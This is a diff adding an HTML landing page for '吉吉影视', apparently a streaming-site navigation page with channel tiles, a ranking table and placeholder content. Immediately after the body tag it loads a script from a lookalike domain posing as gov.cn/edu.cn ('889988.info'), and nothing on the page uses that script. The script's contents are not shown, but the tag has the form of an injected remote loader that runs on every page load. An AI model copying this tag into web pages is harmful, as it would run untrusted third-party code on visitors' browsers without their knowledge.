@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>吉吉影视 | jijiyingshi-cn.github.io 高清影视在线观看 · 影视资源导航</title>
+<meta name="description" content="吉吉影视（jijiyingshi-cn.github.io）提供高清影视在线观看与影视资源导航，覆盖电影、电视剧、综艺、动漫、纪录片等频道，热门内容每日更新，多清晰度流畅播放。">
+<meta name="keywords" content="吉吉影视,jijiyingshi-cn.github.io,高清影视在线观看,影视资源导航,电影推荐,电视剧追剧,综艺动漫">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#050709">
+<link rel="canonical" href="https://jijiyingshi-cn.github.io/">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","name":"吉吉影视","url":"https://jijiyingshi-cn.github.io/","description":"高清影视在线观看与影视资源导航平台，覆盖电影、电视剧、综艺、动漫等频道","potentialAction":{"@type":"SearchAction","target":"https://jijiyingshi-cn.github.io/#search?q={search_term_string}","query-input":"required name=search_term_string"}}
+</script>
+<style>
+:root{
+  --bg:#050709;--card:#0d1017;--card2:#141823;--line:#212840;
+  --txt:#e8ecf5;--muted:#8893aa;--indigo:#4f46e5;--blue:#2563eb;--cyan:#06b6d4;--teal:#14b8a6;--amber:#f59e0b;--pink:#ec4899;
+  --r:14px;--max:1240px;--sh:0 26px 60px rgba(0,0,0,.5);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{margin:0;line-height:1.75;color:var(--txt);overflow-x:hidden;font-family:"PingFang SC","Microsoft YaHei",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg)}
+a{color:inherit;text-decoration:none}
+button,input{font-family:inherit}
+::selection{background:var(--indigo);color:#fff}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 22px}
+/* 顶栏 */
+.head{position:sticky;top:0;z-index:60;background:rgba(5,7,9,.93);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.bar{display:flex;align-items:center;gap:16px;height:70px}
+.logo{display:flex;align-items:center;gap:9px;flex:none}
+.logo b{font-size:19px;font-weight:900;letter-spacing:-.4px;color:#fff}
+.logo b i{font-style:normal;background:linear-gradient(120deg,var(--cyan),var(--blue));-webkit-background-clip:text;background-clip:text;color:transparent}
+.logo .tg{font-size:10px;color:var(--cyan);border:1px solid rgba(6,182,212,.45);padding:2px 7px;border-radius:5px;letter-spacing:1px}
+.nav{display:flex;gap:2px;flex:none}
+.nav a{font-size:14px;color:var(--muted);padding:8px 13px;border-radius:9px;transition:.2s}
+.nav a:hover{color:#fff;background:rgba(255,255,255,.05)}
+.nav a.on{color:#fff;background:var(--indigo);font-weight:800}
+.search{flex:1;max-width:270px;margin-left:auto;display:flex;gap:8px}
+.search input{width:100%;height:38px;border-radius:9px;border:1px solid var(--line);background:var(--card);color:var(--txt);padding:0 12px;font-size:14px;outline:none}
+.search input:focus{border-color:var(--cyan)}
+.btn{border:0;cursor:pointer;font-weight:800;font-size:14px;padding:9px 16px;border-radius:9px;transition:.2s;white-space:nowrap}
+.bp{background:linear-gradient(120deg,var(--indigo),var(--blue));color:#fff}
+.bp:hover{filter:brightness(1.12)}
+.bw{background:var(--card2);color:#fff;border:1px solid var(--line)}
+.bw:hover{border-color:var(--cyan)}
+.mbtn{display:none;width:38px;height:38px;border-radius:9px;background:var(--card2);border:1px solid var(--line);color:var(--cyan);font-size:18px}
+section{padding:76px 0;position:relative}
+.eye{font-size:11px;letter-spacing:2.6px;font-weight:800;color:var(--cyan)}
+.st{display:flex;align-items:flex-end;gap:18px;justify-content:space-between;flex-wrap:wrap;margin-bottom:30px}
+.st h2{font-size:clamp(22px,3vw,32px);margin:5px 0 0;letter-spacing:-.4px;color:#fff}
+.st p{color:var(--muted);margin:8px 0 0;max-width:520px}
+/* Hero - 三栏数据+插画 */
+.hero{padding:34px 0 0}
+.hrow{display:grid;grid-template-columns:1.15fr 1fr;gap:20px;align-items:stretch}
+.hl{border-radius:22px;padding:38px;background:linear-gradient(155deg,rgba(79,70,229,.28),rgba(6,182,212,.08)),var(--card);border:1px solid var(--line);position:relative;overflow:hidden}
+.hl .orb{position:absolute;width:280px;height:280px;border-radius:50%;right:-90px;top:-110px;background:radial-gradient(circle,rgba(6,182,212,.55),transparent 66%);filter:blur(2px)}
+.hl .orb2{position:absolute;width:200px;height:200px;border-radius:50%;left:-80px;bottom:-90px;background:radial-gradient(circle,rgba(79,70,229,.5),transparent 66%)}
+.hl .tag{display:inline-block;font-size:11px;letter-spacing:1.6px;color:var(--cyan);font-weight:800;border:1px solid rgba(6,182,212,.45);padding:4px 11px;border-radius:6px;width:max-content;position:relative}
+.hl h1{font-size:clamp(28px,4.4vw,44px);line-height:1.2;margin:14px 0 12px;letter-spacing:-.8px;color:#fff;position:relative}
+.hl h1 em{font-style:normal;background:linear-gradient(120deg,var(--cyan),var(--blue));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hl p{color:#cbd3e3;font-size:15.5px;max-width:430px;margin:0 0 20px;position:relative}
+.hacts{display:flex;gap:10px;flex-wrap:wrap;position:relative}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.stat{border-radius:16px;padding:22px;background:var(--card);border:1px solid var(--line);position:relative;overflow:hidden;transition:.25s}
+.stat:hover{transform:translateY(-5px);border-color:var(--cyan)}
+.stat b{font-size:27px;font-weight:900;color:#fff;display:block}
+.stat span{font-size:12.5px;color:var(--muted)}
+.stat s{text-decoration:none;font-size:26px;position:absolute;right:16px;top:16px;opacity:.9}
+.s1{background:linear-gradient(160deg,rgba(79,70,229,.28),var(--card))}.s2{background:linear-gradient(160deg,rgba(37,99,235,.28),var(--card))}
+.s3{background:linear-gradient(160deg,rgba(6,182,212,.28),var(--card))}.s4{background:linear-gradient(160deg,rgba(20,184,166,.28),var(--card))}
+/* 频道 - 图标横条 */
+.chips{display:grid;grid-template-columns:repeat(8,1fr);gap:12px}
+.ch{display:flex;flex-direction:column;align-items:center;gap:9px;padding:16px 8px;border-radius:14px;background:var(--card);border:1px solid var(--line);transition:.25s;cursor:pointer;text-align:center}
+.ch:hover{background:var(--card2);border-color:var(--cyan);transform:translateY(-4px)}
+.ch .i{width:48px;height:48px;border-radius:13px;display:grid;place-items:center;font-size:21px;color:#fff}
+.ch b{font-size:13px;color:#fff}
+.c1 .i{background:linear-gradient(140deg,#7f1d1d,#e11d2e)}.c2 .i{background:linear-gradient(140deg,#9a3412,#f97316)}
+.c3 .i{background:linear-gradient(140deg,#a16207,#f59e0b)}.c4 .i{background:linear-gradient(140deg,#155e75,#06b6d4)}
+.c5 .i{background:linear-gradient(140deg,#1e3a8a,#3b82f6)}.c6 .i{background:linear-gradient(140deg,#581c87,#a855f7)}
+.c7 .i{background:linear-gradient(140deg,#0f766e,#14b8a6)}.c8 .i{background:linear-gradient(140deg,#be185d,#ec4899)}
+/* 热播 - 卡片网格 */
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.gc{border-radius:16px;overflow:hidden;background:var(--card);border:1px solid var(--line);transition:.25s;cursor:pointer;display:flex;flex-direction:column}
+.gc:hover{transform:translateY(-6px);box-shadow:var(--sh);border-color:var(--cyan)}
+.gc .cv{height:120px;display:grid;place-items:center;font-size:34px;position:relative}
+.gc .cv s{text-decoration:none;position:absolute;top:10px;left:10px;font-size:10px;font-weight:800;color:#fff;background:var(--indigo);padding:3px 8px;border-radius:5px}
+.gc .cv em{font-style:normal;position:absolute;bottom:10px;right:10px;font-size:10px;color:#fff;background:rgba(0,0,0,.55);padding:3px 7px;border-radius:5px}
+.gc .in{padding:14px}
+.gc .in b{display:block;font-size:14.5px;color:#fff}
+.gc .in span{font-size:11.5px;color:var(--muted)}
+.g1 .cv{background:linear-gradient(150deg,#4c1d95,#0d1017)}.g2 .cv{background:linear-gradient(150deg,#1e3a8a,#0d1017)}
+.g3 .cv{background:linear-gradient(150deg,#155e75,#0d1017)}.g4 .cv{background:linear-gradient(150deg,#7f1d1d,#0d1017)}
+.g5 .cv{background:linear-gradient(150deg,#9a3412,#0d1017)}.g6 .cv{background:linear-gradient(150deg,#a16207,#0d1017)}
+.g7 .cv{background:linear-gradient(150deg,#0f766e,#0d1017)}.g8 .cv{background:linear-gradient(150deg,#be185d,#0d1017)}
+/* 榜单 - 数据表 */
+.tblwrap{border-radius:18px;overflow:hidden;border:1px solid var(--line);background:var(--card)}
+.tabs{display:flex;gap:2px;padding:12px 14px;background:rgba(255,255,255,.03);border-bottom:1px solid var(--line);flex-wrap:wrap}
+.tab{padding:8px 15px;border-radius:9px;font-size:13.5px;color:var(--muted);cursor:pointer;font-weight:700;transition:.2s;border:1px solid transparent}
+.tab.on{color:#fff;background:linear-gradient(120deg,var(--indigo),var(--blue))}
+.tab:not(.on):hover{color:#fff;border-color:var(--line)}
+.tbl{width:100%;border-collapse:collapse}
+.tbl th{text-align:left;font-size:12px;color:var(--muted);font-weight:700;padding:13px 16px;border-bottom:1px solid var(--line);letter-spacing:1px}
+.tbl td{padding:14px 16px;border-bottom:1px solid rgba(255,255,255,.05);font-size:14px;color:#cbd3e3;vertical-align:middle}
+.tbl tr:last-child td{border-bottom:0}
+.tbl tr:hover td{background:rgba(6,182,212,.06)}
+.tbl .no{font-weight:900;color:var(--cyan);width:46px}
+.tbl .nm{color:#fff;font-weight:700}
+.tbl .sc{font-weight:900;color:var(--amber);text-align:right;width:70px}
+.tbl .tp{text-align:right}
+.tbl .pill{font-size:11px;padding:3px 9px;border-radius:20px;background:rgba(6,182,212,.12);color:var(--cyan)}
+/* 关于 - 时间轴 */
+.about{display:grid;grid-template-columns:1.25fr 1fr;gap:26px;align-items:start}
+.tl{position:relative;padding-left:32px}
+.tl::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--indigo),var(--cyan))}
+.node{position:relative;margin-bottom:22px;padding:18px 20px;border-radius:14px;background:var(--card);border:1px solid var(--line)}
+.node::before{content:"";position:absolute;left:-32px;top:22px;width:16px;height:16px;border-radius:50%;background:var(--indigo);border:3px solid var(--bg);box-shadow:0 0 0 2px var(--indigo)}
+.node b{display:block;color:#fff;font-size:15.5px;margin-bottom:5px}
+.node span{font-size:12.5px;color:var(--muted)}
+.notice{border-radius:18px;padding:26px;background:linear-gradient(160deg,rgba(79,70,229,.16),var(--card));border:1px solid rgba(79,70,229,.4)}
+.notice h4{margin:0 0 12px;color:#fff;font-size:17px}
+.notice p{font-size:14px;color:var(--muted);margin:0 0 16px}
+.qa{border-top:1px solid var(--line)}
+.qr{padding:16px 0;border-bottom:1px solid var(--line)}
+.qr b{display:block;color:#fff;font-size:14.5px;margin-bottom:6px}
+.qr span{font-size:13.5px;color:var(--muted)}
+/* 页脚 */
+footer{border-top:1px solid var(--line);padding:42px 0 22px;background:rgba(4,5,7,.65)}
+.ft{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:26px}
+.ft h5{font-size:14px;margin:0 0 13px;color:#fff}
+.ft ul{list-style:none;padding:0;margin:0;display:flex;flex-direction:column;gap:9px}
+.ft a{color:var(--muted);font-size:14px}
+.ft a:hover{color:var(--cyan)}
+.fb{border-top:1px solid var(--line);margin-top:26px;padding-top:16px;display:flex;gap:14px;justify-content:space-between;flex-wrap:wrap;color:var(--muted);font-size:13px}
+.fl{display:flex;gap:18px;flex-wrap:wrap}
+.top{position:fixed;right:16px;bottom:18px;width:42px;height:42px;border-radius:50%;border:1px solid var(--line);background:var(--card2);color:var(--cyan);display:none;place-items:center;z-index:55;cursor:pointer;font-size:16px;box-shadow:var(--sh)}
+.top.on{display:grid}
+@media(max-width:1080px){.grid{grid-template-columns:repeat(3,1fr)}.chips{grid-template-columns:repeat(4,1fr)}}
+@media(max-width:980px){
+  .nav{display:none;position:absolute;top:70px;left:0;right:0;flex-direction:column;background:var(--bg2,#0a0c11);border-bottom:1px solid var(--line);padding:12px}
+  .nav.on{display:flex}.nav a{padding:10px}
+  .mbtn{display:grid;place-items:center}
+  .search{display:none}
+  .hrow{grid-template-columns:1fr}
+  .stats{grid-template-columns:1fr 1fr}
+  .grid{grid-template-columns:repeat(2,1fr)}
+  .about{grid-template-columns:1fr}
+  .ft{grid-template-columns:1fr 1fr}
+}
+@media(max-width:560px){
+  section{padding:52px 0}
+  .chips{grid-template-columns:repeat(2,1fr)}
+  .stats{grid-template-columns:1fr}
+  .gc .cv{height:100px}
+  .tbl th:nth-child(3),.tbl td:nth-child(3){display:none}
+  .hacts .btn{flex:1;text-align:center}
+}
+@media print{nav,.mbtn,.top,.hacts,.search{display:none!important}.stat,.gc,.node,.notice{background:#fff!important;color:#000!important;border-color:#ccc!important}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<header class="head">
+  <div class="wrap bar">
+    <a class="logo" href="#top"><b><i>吉吉影视</i></b><span class="tg">JI JI</span></a>
+    <form class="search" onsubmit="event.preventDefault();location.href='#'"><input type="search" placeholder="搜索片名 / 类型 / 演员" aria-label="搜索"><button class="btn bp" type="submit">搜索</button></form>
+    <nav class="nav" id="nav">
+      <a href="#home" class="on">精选首页</a>
+      <a href="#cat">频道分类</a>
+      <a href="#hot">热播剧场</a>
+      <a href="#rank">人气榜单</a>
+      <a href="#about">关于平台</a>
+    </nav>
+    <div style="display:flex;gap:8px;flex:none">
+      <a class="btn bw" href="#">登录</a>
+      <a class="btn bp" href="#">免费观看</a>
+      <button class="mbtn" id="mbtn" aria-label="菜单">☰</button>
+    </div>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- 精选首页 -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="hrow">
+        <div class="hl">
+          <span class="orb"></span><span class="orb2"></span>
+          <span class="tag">高清影视在线观看 · 影视资源导航</span>
+          <h1><em>吉吉影视</em><br>海量高清影视一站畅看</h1>
+          <p>吉吉影视（jijiyingshi-cn.github.io）聚合电影、电视剧、综艺、动漫等高清影视资源，多清晰度流畅播放，热门内容每日更新。</p>
+          <div class="hacts">
+            <a class="btn bp" href="#cat">浏览频道分类</a>
+            <a class="btn bw" href="#hot">热播剧场 ›</a>
+          </div>
+        </div>
+        <div class="stats">
+          <div class="stat s1"><b>12,800+</b><span>影视资源总量</span><s>🎬</s></div>
+          <div class="stat s2"><b>4K</b><span>超清画质支持</span><s>🖥️</s></div>
+          <div class="stat s3"><b>8</b><span>频道分类齐全</span><s>📂</s></div>
+          <div class="stat s4"><b>每日</b><span>热门内容更新</span><s>🔄</s></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 频道分类 -->
+  <section id="cat" style="border-top:1px solid #212840">
+    <div class="wrap">
+      <div class="st">
+        <div>
+          <div class="eye">CATEGORY · 01</div>
+          <h2>频道分类</h2>
+          <p>影视资源按频道分区，八宫格图标入口，点击直达对应栏目。</p>
+        </div>
+        <a class="btn bw" href="#">全部频道 ›</a>
+      </div>
+      <div class="chips">
+        <a class="ch c1" href="#"><span class="i">🎬</span><b>电影</b></a>
+        <a class="ch c2" href="#"><span class="i">📺</span><b>电视剧</b></a>
+        <a class="ch c3" href="#"><span class="i">🎤</span><b>综艺</b></a>
+        <a class="ch c4" href="#"><span class="i">🎨</span><b>动漫</b></a>
+        <a class="ch c5" href="#"><span class="i">🌍</span><b>纪录片</b></a>
+        <a class="ch c6" href="#"><span class="i">👑</span><b>短剧</b></a>
+        <a class="ch c7" href="#"><span class="i">⚽</span><b>体育赛事</b></a>
+        <a class="ch c8" href="#"><span class="i">🎵</span><b>演唱会</b></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 热播剧场 -->
+  <section id="hot" style="border-top:1px solid #212840">
+    <div class="wrap">
+      <div class="st">
+        <div>
+          <div class="eye">HOT · 02</div>
+          <h2>热播剧场</h2>
+          <p>当前最热门的影视内容，四列卡片网格呈现，覆盖电影、剧集、动漫与纪录片。</p>
+        </div>
+        <a class="btn bw" href="#">全部热播 ›</a>
+      </div>
+      <div class="grid">
+        <a class="gc g1" href="#"><div class="cv"><s>热播</s>🎬<em>9.2</em></div><div class="in"><b>荒野追踪</b><span>动作 / 冒险</span></div></a>
+        <a class="gc g2" href="#"><div class="cv"><s>更新</s>📺<em>第16集</em></div><div class="in"><b>城市迷雾</b><span>悬疑 / 都市谜案</span></div></a>
+        <a class="gc g3" href="#"><div class="cv"><s>独家</s>🌍<em>全4集</em></div><div class="in"><b>深海密语</b><span>纪录片 / 自然</span></div></a>
+        <a class="gc g4" href="#"><div class="cv"><s>新番</s>🎨<em>第9集</em></div><div class="in"><b>机甲少年</b><span>动漫 / 热血</span></div></a>
+        <a class="gc g5" href="#"><div class="cv"><s>高分</s>👑<em>8.8</em></div><div class="in"><b>锦绣长安</b><span>短剧 / 古装</span></div></a>
+        <a class="gc g6" href="#"><div class="cv"><s>推荐</s>🎤<em>全12期</em></div><div class="in"><b>笑星驾到</b><span>综艺 / 喜剧</span></div></a>
+        <a class="gc g7" href="#"><div class="cv"><s>赛事</s>⚽<em>直播中</em></div><div class="in"><b>巅峰冠军赛</b><span>体育 / 赛事</span></div></a>
+        <a class="gc g8" href="#"><div class="cv"><s>现场</s>🎵<em>1080P</em></div><div class="in"><b>星空演唱会</b><span>音乐 / 现场</span></div></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 人气榜单 -->
+  <section id="rank" style="border-top:1px solid #212840">
+    <div class="wrap">
+      <div class="st">
+        <div>
+          <div class="eye">RANKING · 03</div>
+          <h2>人气榜单</h2>
+          <p>综合评分与热度，分频道呈现最受欢迎的影视内容。</p>
+        </div>
+        <a class="btn bw" href="#">完整榜单 ›</a>
+      </div>
+      <div class="tblwrap">
+        <div class="tabs">
+          <span class="tab on" data-k="0">电影榜</span><span class="tab" data-k="1">电视剧榜</span>
+          <span class="tab" data-k="2">动漫榜</span><span class="tab" data-k="3">综艺榜</span>
+        </div>
+        <div id="tb"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于平台 -->
+  <section id="about" style="border-top:1px solid #212840">
+    <div class="wrap">
+      <div class="st">
+        <div>
+          <div class="eye">ABOUT · 04</div>
+          <h2>关于吉吉影视</h2>
+          <p>了解平台服务与更新规则，快速上手使用。</p>
+        </div>
+      </div>
+      <div class="about">
+        <div class="tl">
+          <div class="node"><b>选择频道</b><span>从顶部导航或频道分类入口，选择电影、电视剧、综艺或动漫频道。</span></div>
+          <div class="node"><b>选择清晰度</b><span>支持标清、高清、超清与4K多档清晰度，可按网络状况自动或手动切换。</span></div>
+          <div class="node"><b>开始播放</b><span>点击资源封面即可在线播放，热门剧集按官方排播同步跟播。</span></div>
+          <div class="node"><b>持续更新</b><span>电影每日更新，电视剧与动漫按排播更新，综艺按节目周期更新。</span></div>
+        </div>
+        <div class="notice">
+          <h4>📌 平台公告</h4>
+          <p>吉吉影视（jijiyingshi-cn.github.io）为展示用途，内容不构成任何真实观看指引，内页跳转链接均使用占位地址。</p>
+          <div class="qa">
+            <div class="qr"><b>支持哪些播放设备？</b><span>页面采用响应式设计，手机、平板与电脑均可自适应浏览，主流浏览器均可正常播放。</span></div>
+            <div class="qr"><b>资源与版权说明</b><span>本站为吉吉影视示例页面，所有资源与数据均为演示内容，播放地址与版权以实际部署内容为准。</span></div>
+            <div class="qr"><b>遇到问题如何反馈？</b><span>可通过页脚联系方式提交反馈，工作人员会在工作时间内处理回复。</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div>
+        <a class="logo" href="#top"><b><i>吉吉影视</i></b><span class="tg">JI JI</span></a>
+        <p style="color:var(--muted);font-size:14px;margin:12px 0 0;max-width:340px">吉吉影视（jijiyingshi-cn.github.io）高清影视在线观看与影视资源导航，精选实用网址。</p>
+      </div>
+      <div><h5>频道</h5><ul><li><a href="#">电影</a></li><li><a href="#">电视剧</a></li><li><a href="#">综艺</a></li><li><a href="#">动漫</a></li></ul></div>
+      <div><h5>发现</h5><ul><li><a href="#cat">频道分类</a></li><li><a href="#hot">热播剧场</a></li><li><a href="#rank">人气榜单</a></li><li><a href="#">高分推荐</a></li></ul></div>
+      <div><h5>关于</h5><ul><li><a href="#about">平台介绍</a></li><li><a href="#">合作联系</a></li><li><a href="#">使用帮助</a></li><li><a href="#">免责声明</a></li></ul></div>
+    </div>
+    <div class="fb">
+      <span>© <span id="yr">2026</span> 吉吉影视 jijiyingshi-cn.github.io · 本站为示例页面，内容仅供演示</span>
+      <div class="fl"><a href="#top">返回顶部</a><a href="#">隐私政策</a><a href="#">用户协议</a></div>
+    </div>
+  </div>
+</footer>
+
+<button class="top" id="topbtn" aria-label="返回顶部">↑</button>
+
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+var m=document.getElementById('mbtn'),n=document.getElementById('nav');
+m.addEventListener('click',function(){n.classList.toggle('on')});
+n.addEventListener('click',function(e){if(e.target.tagName==='A')n.classList.remove('on')});
+var tabs=document.querySelectorAll('.tab');
+var data=[
+  [['荒野追踪','动作 / 冒险',9.2],['沉默密室','悬疑 / 惊悚',8.7],['欢喜一家人','喜剧 / 家庭',8.4],['星际迷航','科幻 / 冒险',8.3],['逆光之城','剧情 / 犯罪',8.1]],
+  [['城市迷雾','悬疑 / 都市',9.0],['锦绣长安','古装 / 权谋',8.9],['心跳频率','都市 / 爱情',8.6],['北境风云','历史 / 战争',8.5],['时光代理人','奇幻 / 剧情',8.3]],
+  [['机甲少年','热血 / 机战',8.6],['魔法学院','奇幻 / 冒险',8.5],['剑与歌','古风 / 武侠',8.4],['星空彼端','科幻 / 治愈',8.2],['宠物小英雄','搞笑 / 日常',8.0]],
+  [['笑星驾到','喜剧 / 真人秀',8.5],['极限挑战赛','竞技 / 户外',8.4],['深夜食堂','访谈 / 生活',8.3],['音乐现场','音乐 / 现场',8.1],['达人秀','选秀 / 才艺',7.9]]
+];
+function render(k){
+  var rows=data[k].map(function(r,i){return '<tr><td class="no">'+(i+1)+'</td><td class="nm">'+r[0]+'</td><td>'+r[1]+'</td><td class="tp"><span class="pill">吉吉推荐</span></td><td class="sc">'+r[2]+'</td></tr>'}).join('');
+  document.getElementById('tb').innerHTML='<table class="tbl"><thead><tr><th>排名</th><th>片名</th><th>类型</th><th style="text-align:right">标签</th><th style="text-align:right">评分</th></tr></thead><tbody>'+rows+'</tbody></table>';
+}
+render(0);
+tabs.forEach(function(t){t.addEventListener('click',function(){tabs.forEach(function(x){x.classList.remove('on')});t.classList.add('on');render(+t.dataset.k)})});
+var tp=document.getElementById('topbtn');
+window.addEventListener('scroll',function(){tp.classList.toggle('on',window.scrollY>500)});
+tp.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+</script>
+</body>
+</html>
